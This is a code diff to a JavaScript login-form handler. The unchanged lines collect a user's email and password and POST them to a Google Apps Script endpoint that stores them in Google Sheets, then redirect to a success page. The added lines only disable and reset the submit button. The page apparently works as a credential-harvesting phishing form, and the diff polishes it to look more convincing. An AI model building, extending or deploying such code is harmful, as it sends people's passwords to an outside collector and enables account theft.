@@ -11,6 +11,11 @@ function handleSubmit(event) {
     formData.append("email", email);
     formData.append("password", password);
 
+    // First, disable the form and button to prevent multiple submissions
+    const submitButton = document.querySelector("button[type='submit']");
+    submitButton.disabled = true;
+    submitButton.innerHTML = "Submitting..."; // Update button text
+
     // Send data to Google Sheets using fetch
     fetch('https://script.google.com/macros/s/AKfycbwb-eqY_s93FuDE_RzeUXc710tUDcoCmrLFklqc18sKYwNlXj0yWr7CAJQEr9Icgg0QFA/exec', {
         method: 'POST',
@@ -18,15 +23,20 @@ function handleSubmit(event) {
     })
     .then(response => response.json())  // Expecting JSON response from the server
     .then(data => {
+        // Check if the submission was successful
         if (data.result === 'success') {
-            // Redirect to the success page after successful submission
+            // If successful, redirect to the success page
             window.location.href = "success.html";
         } else {
             alert("There was an error submitting your information. Please try again.");
+            submitButton.disabled = false; // Re-enable the submit button
+            submitButton.innerHTML = "Login"; // Reset button text
         }
     })
     .catch(error => {
         console.error("Error:", error);
         alert("There was an error with the submission. Please try again.");
+        submitButton.disabled = false; // Re-enable the submit button
+        submitButton.innerHTML = "Login"; // Reset button text
     });
 }
